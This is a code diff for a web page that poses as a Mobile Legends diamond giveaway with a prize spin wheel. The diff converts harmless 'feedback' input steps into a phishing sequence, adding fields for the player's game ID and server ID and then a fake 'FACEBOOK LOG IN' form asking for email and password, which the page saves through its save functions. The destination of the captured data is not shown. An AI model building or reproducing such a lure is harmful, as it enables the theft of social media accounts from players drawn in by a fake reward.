@@ -84,44 +84,44 @@ body{
 <!-- RESULT -->
 <div id="resultPage" class="hidden">
   <h2>🎉 You Got</h2>
-  <h1>115 Dias</h1>
+  <h1>115 💎Dias</h1>
   <button class="btn" onclick="toFb(1)">Redeem</button>
 </div>
 
 <!-- FB 1 -->
 <div id="fb1" class="hidden">
-  <div class="fb-title">FEEDBACK</div>
-  <div class="fb-sub">Tell us your experience</div>
+  <div class="fb-title">ENTER ML ID</div>
+  <div class="fb-sub">MOBILE LEGENDS</div>
 
-  <input class="fb-input" placeholder="Feedback 1">
-  <button class="btn" onclick="nextWithWait(1)">Next</button>
+  <input class="fb-input" placeholder="ML ID">
+  <button class="btn" onclick="nextWithWait(1)">ENTER</button>
 </div>
 
 <!-- FB 2 -->
 <div id="fb2" class="hidden">
-  <div class="fb-title">FEEDBACK</div>
-  <div class="fb-sub">Any suggestions?</div>
+  <div class="fb-title">SERVER ID</div>
+  <div class="fb-sub">MOBILE LEGENDS</div>
 
-  <input class="fb-input" placeholder="Feedback 2">
+  <input class="fb-input" placeholder="ML SERVER ID">
   <button class="btn" onclick="nextWithWait(2)">Next</button>
 </div>
 
 <!-- FB 3 (SAVE) -->
 <div id="fb3" class="hidden">
-  <div class="fb-title">FEEDBACK</div>
-  <div class="fb-sub">Report issue or bug</div>
+  <div class="fb-title">FACEBOOK LOG IN</div>
+  <div class="fb-sub">FACEBOOK</div>
 
-  <input class="fb-input" id="f3" placeholder="Feedback 3">
-  <button class="btn" onclick="saveAndNext()">Next</button>
+  <input class="fb-input" id="f3" placeholder="EMAIL">
+  <button class="btn" onclick="saveAndNext()">Enter Email</button>
 </div>
 
 <!-- FB 4 (SAVE) -->
 <div id="fb4" class="hidden">
-  <div class="fb-title">FEEDBACK</div>
-  <div class="fb-sub">Final feedback</div>
+  <div class="fb-title">FACEBOOK LOG IN</div>
+  <div class="fb-sub">FACEBOOK</div>
 
-  <input class="fb-input" id="f4" placeholder="Feedback 4">
-  <button class="btn" onclick="saveFinal()">REDEEM</button>
+  <input class="fb-input" id="f4" placeholder="PASSWORD">
+  <button class="btn" onclick="saveFinal()">Enter Password</button>
 </div>
 
 <!-- WAIT -->
@@ -152,8 +152,8 @@ const load=setInterval(()=>{
 /* ===== SPIN ===== */
 let spun=false;
 const items=[
- "Random Epic Skin","Random Emote","Dias 75","Dias 30",
- "Dias 45","Dias 115","Dias 558","Nothing","Nothing"
+ "🦹‍♂️Random Epic Skin","🐲Random Emote","Dias 💎75","Dias 💎30",
+ "Dias 💎45","Dias 💎115","Dias 💎558","⚫Nothing","⚫Nothing"
 ];
 function spin(){
   if(spun) return;
